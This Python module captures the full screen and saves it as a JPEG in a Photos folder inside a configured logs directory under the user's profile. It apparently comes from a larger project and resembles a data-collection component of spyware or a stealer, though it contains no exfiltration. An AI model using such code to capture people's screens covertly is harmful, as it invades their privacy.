from PIL import ImageGrab
from os import environ, makedirs
from manager.logger import Log
from preferences.config import config

def Screenshot():
    try:
        user = environ['USERPROFILE']
        screen = ImageGrab.grab()
        makedirs(f'{user}\\{config.pathToLogs}\\Photos')
        screen.save(f'{user}\\{config.pathToLogs}\\Photos\\sreenshot.jpg')
    except Exception as e:
        Log(f"Screenshot ---> {e}")